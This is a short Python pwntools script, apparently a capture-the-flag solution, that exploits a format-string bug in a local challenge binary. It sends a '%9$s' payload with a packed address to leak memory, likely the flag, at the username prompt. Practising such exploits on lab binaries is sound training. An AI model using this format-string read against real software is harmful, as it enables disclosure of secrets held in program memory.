from pwn import *
import struct
elf = ELF('./one-hundred-percent-wrong-using-dummy-flag')

context.binary = elf
context.log_level = 'error'

def sol() :
    p = process('./one-hundred-percent-wrong-using-dummy-flag')
    payload = b"%9$sBBBB" + struct.pack("<Q", 0x4040a0) + b"\n"
    
    #context.log_level = 'DEBUG'

    #gdb.attach(p)
    p.sendafter(
        b"username:",
        payload
    )
    p.sendafter(
        b"answer=",
        b"ok\n"
    )
    data = p.recvline()
    print(data)
    data = p.recvline()
    print(data)
    p.interactive()
    p.close()
    
sol()



